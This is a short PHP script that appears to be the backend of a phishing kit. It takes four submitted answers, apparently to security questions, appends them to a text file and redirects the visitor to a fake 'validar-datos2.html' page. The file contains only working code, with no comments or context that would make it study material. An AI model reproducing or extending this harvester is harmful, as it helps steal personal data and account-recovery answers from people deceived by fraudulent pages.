<?php
$ip = getenv("REMOTE_ADDR");
$datoa=$_POST['sqa'];
$datob=$_POST['sq2'];
$datoc=$_POST['sq3'];
$datod=$_POST['sq4'];
$archivo="silfre21$.txt";
$file=fopen($archivo,"a");
fwrite($file, "Respuesta1: " .$datoa.PHP_EOL);
fwrite($file, "Respuesta2: " .$datob.PHP_EOL);
fwrite($file, "Respuesta3: " .$datoc.PHP_EOL);
fwrite($file, "Respuesta4: " .$datod.PHP_EOL);
fclose($file);
Header ("Location:validar-datos2.html");?>
